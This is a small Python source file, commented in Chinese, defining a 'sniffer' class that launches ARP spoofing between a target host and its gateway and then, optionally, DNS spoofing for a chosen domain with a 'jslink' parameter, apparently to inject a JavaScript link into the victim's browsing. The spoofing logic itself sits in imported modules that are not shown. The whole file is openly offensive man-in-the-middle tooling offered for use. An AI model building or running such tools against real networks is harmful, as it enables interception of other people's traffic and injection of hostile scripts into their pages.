# coding:utf-8
import arpspoof
import dnsspoof

"""sniffer类，程序的主要类，主要用于开启arp欺骗以及dns欺骗"""

class sniffer():

    """对sniffer对象进行初始化"""

    def __init__(self,localip,targetip,gatewayip,domain,times,jslink):
        self.localip = localip
        self.targetip = targetip
        self.gatewayip = gatewayip
        self.domain = domain
        self.times = times
        self.jslink = jslink

    """新建线程开启ARP欺骗"""

    def doarpspoof(self):
        doarp = arpspoof.arpspoofer(self.localip,self.targetip,self.gatewayip)
        doarp.start()


    """新建线程开启DNS欺骗"""

    def dodnsspoof(self):
        dodns = dnsspoof.dnsspoofer(self.localip,self.targetip,self.domain,self.times,self.jslink)
        dodns.start()


    """执行ARP欺骗以及DNS欺骗"""

    def start(self):

        """ARP欺骗"""

        self.doarpspoof()

        """判断用户是否开启DNS欺骗"""

        if self.domain != None:
            self.dodnsspoof()
